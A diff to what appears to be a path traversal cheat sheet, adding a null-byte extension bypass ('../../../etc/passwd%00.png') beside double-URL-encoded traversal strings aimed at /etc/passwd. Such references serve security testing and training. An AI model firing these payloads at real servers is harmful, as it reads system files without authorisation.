@@ -52,6 +52,11 @@ File path traversal, traversal sequences stripped with superfluous URL-decode
 ..%c0%af or ..%252f
 Example: ..%252f..%252f..%252fetc/passwd. 
 ```
+File path traversal, validation of file extension with null byte bypass
+```
+filename=../../../etc/passwd%00.png 
+Modify the filename parameter, giving it the value ../../../etc/passwd%00.png
+```
 
 ### 16 bits Unicode encoding
 
